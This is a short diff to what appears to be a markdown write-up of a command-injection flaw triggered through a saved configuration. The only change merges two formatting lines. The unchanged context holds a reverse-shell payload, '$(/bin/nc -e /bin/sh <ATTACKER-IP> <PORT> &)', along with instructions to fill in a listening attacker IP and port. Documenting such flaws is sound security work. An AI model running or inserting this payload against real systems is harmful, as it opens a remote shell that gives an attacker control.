@@ -39,8 +39,7 @@ Once the configuration is saved, the command is executed under the context of th
 $(/bin/nc -e /bin/sh <ATTACKER-IP> <PORT> &)
 ```
 
-> 🔧 Replace `<ATTACKER-IP>` with your IP where Netcat is listening.
-> 🔧 Replace `<PORT>` with your port where Netcat is listening.
+> 🔧 Replace `<ATTACKER-IP>` with your IP where Netcat is listening. Replace `<PORT>` with your port where Netcat is listening.
 
 ---
 
